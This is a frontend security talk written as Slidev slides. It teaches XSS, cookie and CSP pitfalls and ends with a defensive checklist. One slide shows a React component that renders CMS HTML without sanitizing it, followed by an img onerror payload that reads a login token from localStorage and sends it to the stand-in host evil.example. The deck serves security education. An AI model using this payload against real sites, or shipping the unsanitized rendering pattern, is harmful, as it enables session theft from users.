---
theme: dracula
title: Frontend Security
transition: slide-left
htmlAttrs:
  lang: en
---

# 🔐 Frontend Security

Attacks your framework won't stop

---

# Agenda

<div class="agenda">
<Link to="browser" class="agenda-item"><span class="num">01</span> How the browser thinks<small>XSS, cookies and CSP beyond the acronyms</small></Link>
<Link to="dangerous-code" class="agenda-item" style="--accent: var(--green)"><span class="num">02</span> Dangerous code<small>Where you step outside React's protection</small></Link>
<Link to="dependencies" class="agenda-item" style="--accent: var(--cyan)"><span class="num">03</span> Code you didn't write<small>Third-party problems become first-party ones</small></Link>
<Link to="incidents" class="agenda-item" style="--accent: var(--orange)"><span class="num">04</span> It actually happened<small>Real incidents, including React itself</small></Link>
</div>

---

# Seen this in a PR?

<div class="sub">Post bodies come from the CMS as HTML, so we render them as HTML</div>

```jsx
function Post({ post }) {
  // post.body is HTML from the CMS: headings, links, images
  return (
    <article dangerouslySetInnerHTML={{ __html: post.body }} />
  )
}
```

<div class="flow">
  <div class="step">Author<small>guest writer, editor</small></div>
  <lucide-arrow-right class="arrow" />
  <div class="step">CMS<small>stores the HTML</small></div>
  <lucide-arrow-right class="arrow" />
  <div class="step lit">&lt;Post&gt;<small>renders it as HTML</small></div>
  <lucide-arrow-right class="arrow" />
  <div class="step">Every reader's browser</div>
</div>

<div class="note text-center">Whoever can write a post decides what HTML every reader gets: a guest author, or anyone who takes over an editor account</div>

<div class="bridge">So what happens if an author saves <b>this</b> as the body?</div>

---

# One image tag, one stolen token

<div class="sub">The post body an attacker saves in the CMS, rendered by our <code>&lt;Post&gt;</code> component</div>

<div class="cols middle">
<div>

```html {1|2|3|4|all}
<img src="x"
  onerror="
    const t = localStorage.token
    fetch('https://evil.example/?t=' + t)
  ">
```

<ol class="steps">
  <li v-click="1"><b>src="x"</b>: points to a file named x that doesn't exist, so loading is <i>guaranteed</i> to fail</li>
  <li v-click="2"><b>onerror</b>: when it fails, the browser runs this attribute as JavaScript, with the same powers as your own code</li>
  <li v-click="3"><b>localStorage.token</b>: reads the reader's login token, which this app keeps there</li>
  <li v-click="4"><b>fetch(…)</b>: sends the token to the attacker's server. To the browser, it's just another request</li>
  <li v-click="5" class="why"><b>Why an image?</b> A <code>&lt;script&gt;</code> set through innerHTML never runs, but <code>onerror</code> always does. The image only exists to fail</li>
</ol>

</div>
<div class="fit hook-result">

<div class="devtools">
<div class="dt-h">DevTools → Network</div>
<div class="dt-row ng">GET https://evil.example/?t=demo-token-not-a-secret</div>
<div class="dt-row">(failed) net::ERR_NAME_NOT_RESOLVED</div>
</div>

<div class="note">evil.example doesn't exist. A real attacker's server would log the token from the URL</div>

<div class="pills"><DemoLink href="demos/hook.html">Open the demo page</DemoLink></div>

</div>
</div>

<div class="source"><lucide-link /><a href="https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations" target="_blank">MDN: innerHTML, security considerations</a></div>

<style>
.steps { font-size: 0.8rem; margin-top: 0.6rem; }
.steps li { margin: 0.25rem 0; }
.steps b { color: var(--orange); font-family: var(--slidev-code-font-family, monospace); font-weight: normal; }
.steps .why { list-style: none; margin-left: -1.2rem; margin-top: 0.6rem; }
.steps .why b { color: var(--cyan); font-family: inherit; font-weight: bold; }
.hook-result { width: 22rem; }
</style>

---
src: ./pages/01-browser.en.md
---

---
src: ./pages/02-dangerous-code.en.md
---

---
src: ./pages/03-dependencies.en.md
---

---
src: ./pages/04-incidents.en.md
---

---

# Before you ship: a checklist

<div class="sub">One card per section</div>

<div class="checklist">
<div class="card">
<div class="col-h"><span class="num">01</span> The browser</div>

- **Session token**: in an HttpOnly, SameSite cookie
- **No data changes on GET**: Lax still sends the cookie
- **CSP**: without `'unsafe-inline'`

</div>
<div class="card" style="--accent: var(--green)">
<div class="col-h"><span class="num">02</span> Your code</div>

- **User data never reaches** `innerHTML`, `eval`, `location.href`
- **HTML you must render**: sanitize it (DOMPurify)
- **JSON inside a script tag**: escape `<`

</div>
<div class="card" style="--accent: var(--cyan)">
<div class="col-h"><span class="num">03</span> Code you didn't write</div>

- **Installs**: from the lockfile, with a release-age delay
- **Install scripts**: off unless allowed (npm: `ignore-scripts`)
- **Third-party scripts**: an `integrity` hash, or self-host
- **Env vars**: no secrets in `NEXT_PUBLIC_`

</div>
<div class="card" style="--accent: var(--orange)">
<div class="col-h"><span class="num">04</span> The framework</div>

- **Security advisories**: patch the moment they land
- **Update the right package**: in Next.js, `next`, not `react`

</div>
</div>

<style>
.checklist { display: grid; grid-template-columns: 1fr 1fr; gap: 0.6rem; margin-top: 0.6rem; }
.checklist .card { padding: 0.5rem 0.9rem; border-left: 3px solid var(--accent, var(--purple)); }
.checklist .col-h { margin-bottom: 0.1rem; }
.checklist .num { color: var(--accent, var(--purple)); font-weight: bold; margin-right: 0.3rem; }
.checklist li { font-size: 0.75rem; }
</style>

---
layout: center
class: text-center
---

# Security is yours to own

<div class="cta">The framework won't do it for you: your code, your dependencies, your call</div>

<div class="pills">
<a class="pill" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank"><lucide-link />OWASP: XSS prevention</a>
<a class="pill" href="https://developer.mozilla.org/en-US/docs/Web/Security" target="_blank"><lucide-link />MDN: Web security</a>
<a class="pill" href="https://nextjs.org/docs/app/guides/data-security" target="_blank"><lucide-link />Next.js: Data security</a>
<a class="pill" href="https://pnpm.io/supply-chain-security" target="_blank"><lucide-link />pnpm: Supply chain security</a>
<DemoLink href="demos/index.html">The demo pages</DemoLink>
</div>
